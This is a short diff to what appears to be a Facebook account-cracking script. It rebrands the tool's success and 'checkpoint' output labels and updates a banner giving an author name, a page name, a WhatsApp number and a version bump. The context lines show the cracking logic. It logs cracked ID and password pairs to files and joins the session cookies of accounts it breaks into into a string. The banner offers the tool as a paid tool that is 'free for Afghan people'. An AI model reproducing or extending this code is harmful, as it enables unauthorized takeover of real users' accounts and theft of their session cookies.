@@ -712,7 +712,7 @@ def free(idf,pwv):
 
 			if "checkpoint" in po.cookies.get_dict().keys():
 
-				rint( f'\r\x1b[1;91m [ NAFIUL-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ 😢AWM-CP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -726,7 +726,7 @@ def free(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ ASAD  MALIK-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ 🙂AWM-OK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
@@ -786,13 +786,13 @@ _________________(×_×)______________________
 
 [√] Auther      :  Mirwais Danishyar
 
-[√] Page          :  AWM TECH
+[√] Page        :  AWM TECH
 
-[√] Facebook     :  Mirwais Danishyar
+[√] Facebook    :  Mirwais Danishyar
 
-[√] WhatsApp     : +93 796 74 73 43
+[√] WhatsApp    : +93 796 74 73 43
 
- [√] Version       : 1.2
+ [√] Version    : 1.3
 
 [√] Status      : Paid Tool Just Now Log In 🔥 Free for Afghan People
 
